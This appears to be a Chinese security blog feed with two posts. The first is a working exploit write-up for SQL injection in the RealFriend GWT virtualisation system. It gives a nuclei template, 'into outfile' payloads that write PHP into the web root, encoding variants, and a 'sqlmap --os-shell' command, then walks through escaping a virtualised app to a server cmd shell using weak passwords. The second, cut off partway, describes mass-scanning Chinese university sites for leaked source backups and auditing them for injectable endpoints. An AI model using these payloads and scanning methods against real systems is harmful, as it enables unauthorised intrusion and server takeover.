<p>瑞友天翼应用虚拟化系统（GWT System）是国内具有自主知识产权的应用虚拟化平台，是基于服务器计算（Server-based Computing）的应用虚拟化平台。它将用户所有应用软件（ERP、OA、CRM、PDM、CAD……）集中部署在天翼服务器（群）上，客户端通过WEB即可快速安全的访问经服务器上授权的应用软件，实现集中应用、远程接入、协同办公等，从而为用户打造集中、便捷、安全、高效的虚拟化支撑平台。操作终端无需再安装应用程序，通过天翼独特的RAP 协议（Remote Application Protocol），即可让用户快速访问服务器上的各类应用软件；天翼RAP 协议只传输鼠标、键盘及屏幕变化的矢量数据，访问仅需3KB&#x2F;s（20kbps）的带宽，用户不再受客户端和连接性能要求的限制，在任何时间、任何地点，利用任何设备、任何网络连接方式，即可高效安全地访问服务器（群）上的应用程序和关键资源。</p>
</blockquote>
<p>该系统存在Nday Sql注入漏洞为西安瑞友信息技术资讯有限公司产品。<br>影响范围：5.x &lt;&#x3D; 瑞友天翼应用虚拟化系统（GWT System） &lt;&#x3D; 7.0.2</p>
<p>看一下历史漏洞POC，是个Sql注入，并且默认有权限可直接使用mysql写文件Getshell</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">http:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">raw:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">|</span></span><br><span class="line"><span class="string">        GET /AgentBoard.XGI?user=&#x27;||&#x27;1&amp;cmd=UserLogin HTTP/1.1</span></span><br><span class="line"><span class="string">        Host: &#123;&#123;Hostname&#125;&#125;</span></span><br><span class="line"><span class="string"></span>      <span class="bullet">-</span> <span class="string">|</span></span><br><span class="line"><span class="string">        GET /Board.XGI HTTP/1.1</span></span><br><span class="line"><span class="string">        Cookie: PHPSESSID=&#123;&#123;cookie&#125;&#125;</span></span><br><span class="line"><span class="string">        Host: &#123;&#123;Hostname&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line">    <span class="attr">extractors:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">regex</span></span><br><span class="line">        <span class="attr">name:</span> <span class="string">cookie</span></span><br><span class="line">        <span class="attr">internal:</span> <span class="literal">true</span></span><br><span class="line">        <span class="attr">part:</span> <span class="string">header</span></span><br><span class="line">        <span class="attr">group:</span> <span class="number">1</span></span><br><span class="line">        <span class="attr">regex:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">&#x27;PHPSESSID=(.*?);&#x27;</span></span><br><span class="line">    <span class="attr">matchers:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">dsl</span></span><br><span class="line">        <span class="attr">dsl:</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">&#x27;contains(body_1,&quot;CustomInfo&quot;) &amp;&amp; contains(header_1,&quot;PHPSESSID&quot;)&#x27;</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">&#x27;contains(body_2,&quot;src=\&quot;custom/&quot;)&#x27;</span></span><br><span class="line">        <span class="attr">condition:</span> <span class="string">and</span></span><br></pre></td></tr></table></figure>

<p>写Shell POC：<br><img src="/images/Pasted%20image%2020240708140925.png"></p>
<p>看一下POC：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /AgentBoard.XGI?user=-1%27+union+select+1%2C%27%3C%3Fphp+phpinfo%28%29%3B%3F%3E%27+into+outfile+%22C%3A%5C%5CProgram%5C+Files%5C+%5C%28x86%5C%29%5C%5CRealFriend%5C%5CRap%5C+Server%5C%5CWebRoot%5C%5Ctest.php%22+--+-&amp;cmd=UserLogin HTTP/1.1</span><br><span class="line">Host: 0.0.0.0</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解码一下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user=-1&#x27;+union+select+1,&#x27;&lt;?php+phpinfo();?&gt;&#x27;+into+outfile+&quot;C:\\Program\+Files\+\(x86\)\\RealFriend\\Rap\+Server\\WebRoot\\test.php&quot;+--+-&amp;cmd=UserLogin</span><br></pre></td></tr></table></figure>

<p>Tips：在实际环境测试中，对于此类写shell，可尝试多种转换写法。</p>
<ul>
<li><p>使用HEX编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user=-1&#x27;+union+select+1,0x3c3f7068702b706870696e666f28293b3f3e+into+outfile+&quot;C:\\Program\+Files\+\(x86\)\\RealFriend\\Rap\+Server\\WebRoot\\test.php&quot;+--+-&amp;cmd=UserLogin</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用相对目录（程序安装目录存在差异情况下的测试方式，并非直接写shell路径）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user=-1&#x27;+union+select+1,0x3c3f7068702b706870696e666f28293b3f3e+into+outfile+&quot;..\\..\\WebRoot\\test.php&quot;+--+-&amp;cmd=UserLogin</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user=-1&#x27;+union+select+1,0x3c3f7068702b706870696e666f28293b3f3e+into+outfile+&quot;..\\..\\RealFriend\\Rap\+Server\\WebRoot\\test.php&quot;+--+-&amp;cmd=UserLogin</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user=-1&#x27;+union+select+1,0x3c3f7068702b706870696e666f28293b3f3e+into+outfile+&quot;..\\..\\test.php&quot;+--+-&amp;cmd=UserLogin</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用sqlmap FUZZ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.target.com/AgentBoard.XGI?user=-1*&quot; --os-shell --batch</span><br></pre></td></tr></table></figure></li>
</ul>
<p>Tips：通常此系统数据库配置文件位于（具体位置记不得了）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Program Files(x86)\RealFriend\Rap Server\conf\</span><br></pre></td></tr></table></figure>
<p><img src="/images/Pasted%20image%2020240708143542.png"></p>
<h2 id="系统后台获取内网权限"><a href="#系统后台获取内网权限" class="headerlink" title="系统后台获取内网权限"></a>系统后台获取内网权限</h2><p>下载客户端软件<br><img src="/images/Pasted%20image%2020240708145315.png"></p>
<p>安装软件进行登陆（系统存在弱口令）<br><img src="/images/Pasted%20image%2020240708145414.png"></p>
<p>进入客户端后台后可发现使用的是rdp连接到远程虚拟化应用系统，但无执行CMD命令功能等操作。<br><img src="/images/Pasted%20image%2020240708145642.png"></p>
<p>当前虚拟化应用存在3个应用，<strong>对于虚拟化应用可尽量在应用内找到能调用浏览器的入口</strong>，此处打开<code>金蝶</code><br><img src="/images/Pasted%20image%2020240708145759.png"></p>
<p>接着使用虚拟化应用的弱口令登陆。<br><img src="/images/Pasted%20image%2020240708145935.png"></p>
<p>在<code>金蝶</code>应用中存在远程协助功能，可使用此功能调出IE浏览器，保存页面可调出文件管理器，但此时只能保存成txt文件，意味着我们无法查看到除txt外其他文件类型。<br>路径是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">服务-》远程协助-》可以打开浏览器-》浏览器内点击工具-》开发人员工具-》ctrl+s保存页面-》点击桌面-》右键***.txt（已经存在了的txt文件） 选择打开-》</span><br></pre></td></tr></table></figure>
<p><img src="/images/Pasted%20image%2020240708155932.png"></p>
<p>接着另存txt-》保存类型选择全部-》找到cmd目录，右键打开CMD即可执行命令获取服务器权限。<br><img src="/images/Pasted%20image%2020240708155833.png"></p>
<p><img src="/images/Pasted%20image%2020240708160041.png"></p>
<p>拓展：针对其他虚拟化平台的利用策略<br>每一个功能点都详尽测试，尽量找可以调用浏览器的点：<br><img src="/images/Pasted%20image%2020241219130728.png"></p>
<p>调用出浏览器后和上面操作一样即可。<br><img src="/images/Pasted%20image%2020241219130939.png"></p>
<p>接着上线即可<br><img src="/images/Pasted%20image%2020240708160209.png"></p>
]]></content>
  </entry>
  <entry>
    <title>《DotNET代码审计》但是脚本小子版</title>
    <url>/2025/01/22/%E3%80%8ADotNET%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%8B%E4%BD%86%E6%98%AF%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90%E7%89%88/</url>
    <content><![CDATA[<h1 id="0x01-起因"><a href="#0x01-起因" class="headerlink" title="0x01 起因"></a>0x01 起因</h1><p>小露快把漏洞Top10学差不多了，虽然我猜测她也是仅学了原理，如果运用在现实里大概率是坐牢（形容词：指手足无措，只能干耗时间），为帮助她能有个好的实战经验，我掏出好几年没看过的EDUSRC，想到我入门的时候RG大哥随便甩给我5，6个学校的任意文件下载，就留下一句：“去交吧”，我就能想到他伟岸的背影。<br><img src="/images/Pasted%20image%2020240806052937.png"></p>
<p>所以我也为小露添加点“初入门栏”就能快点看到曙光的动力，提前看看edusrc，帮她做点什么。</p>
<p>（此外还叠加下用github搭建的博客不需要钱（<a href="https://z1sec.github.io/%EF%BC%89%EF%BC%8C%E4%B8%8D%E5%86%99%E4%BA%9B%E4%BB%80%E4%B9%88%E4%B8%8A%E6%9D%A5%E5%A7%8B%E7%BB%88%E8%A7%89%E5%BE%97%E4%BA%8F%E4%BA%86%E3%80%82%E9%81%82%E5%87%BA%E6%AD%A4%E6%96%87%E3%80%82%EF%BC%89">https://z1sec.github.io/），不写些什么上来始终觉得亏了。遂出此文。）</a></p>
<h1 id="0x02-Find-bugs"><a href="#0x02-Find-bugs" class="headerlink" title="0x02 Find bugs"></a>0x02 Find bugs</h1><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>挖EDU对我现在来说确实有点没意思了（无歧视edu白帽的意思，仅仅只是因为资产太多了，找到一些漏洞确实简单，工具扫描即可）<br><img src="/images/Pasted%20image%2020240806053932.png"></p>
<p>想着给小露找点有意思的、并且是通用的系统、并且可以快速刷分的漏洞，最快的方式就是找源码了。那么如何找到源码呢？</p>
<ul>
<li>如何获取源码？</li>
</ul>
<p>方案1：利用nday找edu系统，攻击后成功后获取源码，审计获取0day，批量提交edu刷分。<br>答：易被追责，没这个胆子。</p>
<p>方案2：批量扫备份文件，下载后，审计获取0day，批量提交edu刷分。<br>答：可行，无害化，但存在问题：及时审计到漏洞，系统也不一定是通用，不一定能上大分。</p>
<p><strong>还是选择了方案2，说不定会遇到通用。</strong></p>
<ul>
<li>选什么系统？</li>
</ul>
<p>方案：目前主流网站架构：java、.net、python、go、php，其中.net和php相对来说要更容易泄漏备份文件（不要问为什么，网站部署结构使然），其中.net相对攻击面也会更广一些</p>
<p><strong>攻击面更广解释</strong>：脚本特性使然，例如php写鉴权，鉴了就是鉴了，基本很少出现权限绕过，而.net则更容易出现鉴权的问题，通常ashx或asmx接口程序猿压根不设限制。虽然java也有一些鉴权绕过，但出现备份文件泄漏的概率比较低就不过多解释了。<br>此外.net更多会使用mssql，也就是说如果能找到sql注入也就有更大概率可以RCE，都代码审计了，谁会不想要个RCE呢？</p>
<h2 id="定位攻击面"><a href="#定位攻击面" class="headerlink" title="定位攻击面"></a>定位攻击面</h2><p>fofa来个简单的语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">host=&quot;edu.cn&quot; &amp;&amp; server=&quot;Microsoft-IIS&quot;</span><br></pre></td></tr></table></figure>
<p><img src="/images/Pasted%20image%2020240806061520.png"></p>
<h2 id="备份文件扫描"><a href="#备份文件扫描" class="headerlink" title="备份文件扫描"></a>备份文件扫描</h2><p>导出2000多条链接试一试水，看看能不能找到备份文件。<br><img src="/images/Pasted%20image%2020240806061754.png"></p>
<p>此时出现了问题，如何批量扫描找备份文件呢？<br>想了下，写一个nuclei脚本，速度快，yaml脚本编写方便，为了防止空军，我还特地加了一些常见的soap路径：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">id:</span> <span class="string">soap-dir-scan</span></span><br><span class="line"></span><br><span class="line"><span class="attr">info:</span>  </span><br><span class="line">  <span class="attr">name:</span> <span class="string">soap</span> <span class="string">dir</span> <span class="string">scan</span></span><br><span class="line">  <span class="attr">author:</span> <span class="string">mucn</span>  </span><br><span class="line">  <span class="attr">severity:</span> <span class="string">high</span>  </span><br><span class="line">  <span class="attr">description:</span> <span class="string">soap</span> <span class="string">dir</span> <span class="string">scan</span></span><br><span class="line"></span><br><span class="line"><span class="attr">requests:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="attr">method:</span> <span class="string">GET</span></span><br><span class="line">    <span class="attr">path:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/Service.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/DataService.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/ADPosService.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/ajaxhandler.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/AjaxService.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/autocomplete.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/BrowseAuctions.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/getbasketdata.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/getcustomerinfo.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/home/SignupNewsletter.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/HTMLGenerator.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/MapServiceProxyWS.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/momondo.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/myalamycustomer.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/newcars/ScriptService.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/orderservice.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/processRequest.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/progress.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/services&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/search.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/services/forms/formapi.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/services/locatorSearch.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/services/WebServices/VATService.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/Shoppingws.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/SiteServer/Services/AdministratorService.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/sports/Services/AjaxMethods.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/stat.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/stockquote.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/Tracking.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/verify.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/webservice.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/ws/ErrorTrap.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/ws/FacetService.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/ws/Schedules.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/wsutils.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/yocityws/SoapHeaderService.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/UserCenter.asmx&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/webservice&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/bin.zip&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/bin.rar&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/web.zip&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;<span class="template-variable">&#123;&#123;BaseURL&#125;&#125;</span>/web.rar&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">matchers:</span>  </span><br><span class="line">      <span class="bullet">-</span> <span class="attr">type:</span> <span class="string">dsl</span>  </span><br><span class="line">        <span class="attr">dsl:</span>  </span><br><span class="line">          <span class="bullet">-</span> <span class="string">&#x27;status_code == 200&#x27;</span></span><br><span class="line">          <span class="bullet">-</span> <span class="string">&#x27;status_code == 403&#x27;</span></span><br><span class="line">        <span class="attr">condition:</span> <span class="string">or</span></span><br></pre></td></tr></table></figure>



<h1 id="0x03-开始审计"><a href="#0x03-开始审计" class="headerlink" title="0x03 开始审计"></a>0x03 开始审计</h1><h2 id="XXX医药大学"><a href="#XXX医药大学" class="headerlink" title="XXX医药大学"></a>XXX医药大学</h2><p><img src="/images/Pasted%20image%2020240808112935.png"></p>
<h3 id="找入口DLL文件"><a href="#找入口DLL文件" class="headerlink" title="找入口DLL文件"></a>找入口DLL文件</h3><p>解压RAR，获取DLL文件：<br><img src="/images/Pasted%20image%2020240808113120.png"></p>
<ul>
<li>针对此网站找路由的方式：</li>
</ul>
<p>当访问一个不存在的地址时程序会跳转统一报错页面，并输出错误信息，但是这里没有输出具体调用的代码，只有调用System.Web.Mvc的相关信息，这不是我们想要的。<br><img src="/images/Pasted%20image%2020240808113420.png"></p>
<p>接着爆破（大力出奇迹）：<br><img src="/images/Pasted%20image%2020240806043002.png"></p>
<p>当指定目标主路由时，默认子路由不存在则会报错，此时得到入口地址：<br><img src="/images/Pasted%20image%2020240808113632.png"></p>
<h3 id="反编译入口"><a href="#反编译入口" class="headerlink" title="反编译入口"></a>反编译入口</h3><p>使用Dnspy反编译，C#属性印入眼帘<br><img src="/images/Pasted%20image%2020240809095550.png"></p>
<p>属性解释：</p>
<ul>
<li><code>[assembly: AssemblyVersion(&quot;6.2.1.0&quot;)]</code>: 定义程序集的版本号，通常用于版本管理和兼容性。</li>
<li><code>[assembly: CompilationRelaxations(8)]</code>: 指定编译器的放宽规则，通常用于优化编译过程。</li>
<li><code>[assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]</code>: 允许处理非异常抛出的代码，提供更好的运行时兼容性。</li>
<li><code>[assembly: Debuggable(...)]</code>: 指示调试器在调试时如何处理代码，如关闭优化、忽略符号存储点等，以便更容易进行调试。</li>
<li><code>[assembly: PreApplicationStartMethod(typeof(SwaggerConfig), &quot;Register&quot;)]</code>: 指定在应用框架启动之前要执行的静态方法，通常用于配置设置，如Swagger配置。</li>
<li><code>[assembly: AssemblyTitle(&quot;BPMClient&quot;)]</code>: 指定程序集的标题。</li>
<li><code>[assembly: AssemblyDescription(&quot;MVC5+WEBAPI&quot;)]</code>: 提供程序集的描述信息，通常用于文档和显示目的。</li>
<li><code>[assembly: AssemblyConfiguration(&quot;&quot;)]</code>: 可填写此程序集的配置，如“Debug”、“Release”等，通常留空。</li>
<li><code>[assembly: AssemblyCompany(&quot;&quot;)]</code>: 指定公司名称，通常用于发布信息。</li>
<li><code>[assembly: AssemblyProduct(&quot;BPMClient&quot;)]</code>: 指定程序集的产品名称。</li>
<li><code>[assembly: AssemblyCopyright(&quot;版权所有(C) 2018&quot;)]</code>: 版权声明，通常包含版权所有的年份。</li>
<li><code>[assembly: AssemblyTrademark(&quot;&quot;)]</code>: 商标信息，通常留空或者填写商标名称。</li>
<li><code>[assembly: ComVisible(false)]</code>: 指示程序集是否可用于 COM 组件，<code>false</code>表示不可见。</li>
<li><code>[assembly: Guid(&quot;01a316fe-79ac-4fd2-87cf-221c3f1e4ca2&quot;)]</code>: 为程序集指定一个唯一的标识符（GUID），通常用于 COM。</li>
<li><code>[assembly: AssemblyFileVersion(&quot;6.2.1.0&quot;)]</code>: 指定文件的版本信息，通常用于文件系统。</li>
<li><code>[assembly: TargetFramework(&quot;.NETFramework,Version=v4.5&quot;, FrameworkDisplayName = &quot;.NET Framework 4.5&quot;)]</code>: 表示目标框架，指定该程序集是基于 .NET Framework 4.5。</li>
<li><code>[assembly: SecurityPermission(SecurityAction.RequestMinimum, SkipVerification = true)]</code>: 请求最低的安全权限，允许代码在某些条件下跳过验证过程，通常在多信任环境中使用。</li>
</ul>
<p>接下来优先看controller就好<br><img src="/images/Pasted%20image%2020240809100157.png"></p>
<h3 id="Webservice接口导致Sql注入"><a href="#Webservice接口导致Sql注入" class="headerlink" title="Webservice接口导致Sql注入"></a>Webservice接口导致Sql注入</h3><p>controller大致看了十几分钟没了兴致，发现大部分控制器都鉴权了，而我只想要快速出洞。</p>
<ul>
<li>这里多说两句鉴权</li>
</ul>
<p>此处直接在类和index方法上都加了<code>[Authorize]</code>注解<br><img src="/images/Pasted%20image%2020240809100701.png"></p>
<p>追进去看一下，定义了一些鉴权操作<br><img src="/images/Pasted%20image%2020240809100940.png"></p>
<p>众所周知.net环境下webservice内容定义的接口文档通常是无需权限验证的，<code>DMMWS</code>这个类吸引了我的注意。</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">[<span class="meta">WebService(Namespace = <span class="string">&quot;http://tempuri.org/&quot;</span>)</span>]</span><br><span class="line">[<span class="meta">WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)</span>]</span><br><span class="line">[<span class="meta">ToolboxItem(false)</span>]</span><br><span class="line">[<span class="meta">ScriptService</span>]</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">DMMWS</span> : <span class="title">WebService</span></span><br><span class="line"><span class="comment">// DMMWS继承自WebService</span></span><br></pre></td></tr></table></figure>

<p>这个函数传参数很简单，跟进去看看<br><img src="/images/Pasted%20image%2020240815141402.png"></p>
<p>拼接字符串，其实看到这就能想到后面大概率是sql注入了<br><img src="/images/Pasted%20image%2020240815141529.png"></p>
<p>跟进，开始拼接查数据库数据了，<strong>sql注入+1</strong><br><img src="/images/Pasted%20image%2020240815141700.png"></p>
<h3 id="利用namespace反向找asmx"><a href="#利用namespace反向找asmx" class="headerlink" title="利用namespace反向找asmx"></a>利用namespace反向找asmx</h3><p>现在找到了sql注入漏洞，问题来了，怎么访问呢？</p>
<ul>
<li>来看个案例</li>
</ul>
<p>namespace为<code>HMFW.Web.API</code>，class类为：<code>DibaoImport</code>，设置了WebService类型<br>可以判断出文件具体位置为：<code>/api/DibaoImport.asmx</code></p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">HMFW.Web.API</span></span><br><span class="line">&#123;</span><br><span class="line">	[<span class="meta">WebService(Namespace = <span class="string">&quot;http://tempuri.org/&quot;</span>)</span>]</span><br><span class="line">	[<span class="meta">WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)</span>]</span><br><span class="line">	[<span class="meta">ToolboxItem(false)</span>]</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">class</span> <span class="title">DibaoImport</span> : <span class="title">WebService</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="built_in">string</span> GFCID</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">get</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="keyword">this</span>._GFCID;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">set</span></span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">this</span>._GFCID = <span class="keyword">value</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/images/Pasted%20image%2020240223173208.png"></p>
<p>这里也是一样，namespace：</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">BPMClient.WebServices</span></span><br></pre></td></tr></table></figure>

<p>class：</p>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">DMMWS</span> : <span class="title">WebService</span></span><br></pre></td></tr></table></figure>

<p>接口路径：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/WebServices/DMMWS.asmx</span><br></pre></td></tr></table></figure>
<p><img src="/images/Pasted%20image%2020240815142453.png"></p>
<p>接下来不管是使用wsdl的方式使用xml传参还是用post传也都一样了，这里使用原生功能传参。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /WebServices/DMMWS.asmx/GetProcessModelListByPN HTTP/1.1</span><br><span class="line">Host: xxxxx</span><br><span class="line">Cookie: ASP.NET_SessionId=111</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">processName=1</span><br></pre></td></tr></table></figure>

<p>sqlmap一下：<br><img src="/images/Pasted%20image%2020240815142805.png"></p>
<h3 id="导出PDF导致RCE"><a href="#导出PDF导致RCE" class="headerlink" title="导出PDF导致RCE"></a>导出PDF导致RCE</h3><p>其实系统里面还有一些其他sql注入，这里就不赘述了，有了一个漏洞准备收工了，最后胡乱点击看看其他代码，发现了一个类：<code>ExportPDF</code>，发现他的方法是Page_Load，没想到这还不是纯mvc的架构，还有一些单独的aspx文件。</p>
<p>解释：通常情况下.net环境，aspx文件会编译为dll文件，在后续的访问中进行对应调用，访问aspx时默认会调用其对应的Page_Load方法。<br><img src="/images/Pasted%20image%2020240815143716.png"></p>
<p>传输了4个参数：TaskID、Number、Type、PROCESSNAME<br>接着实例化pdfExport调用HtmlToPdf方法传入了参数。</p>
<p>简单阅读HtmlToPdf，总而言之就是将传入的值拼接，然后调用cmd执行wkhtmltopdf.exe将网页导出为pdf。<br><img src="/images/Pasted%20image%2020240815144648.png"></p>
<p>实例化Process，然后执行命令：<br><img src="/images/Pasted%20image%2020240815144811.png"></p>
<ul>
<li>简单解释下</li>
</ul>
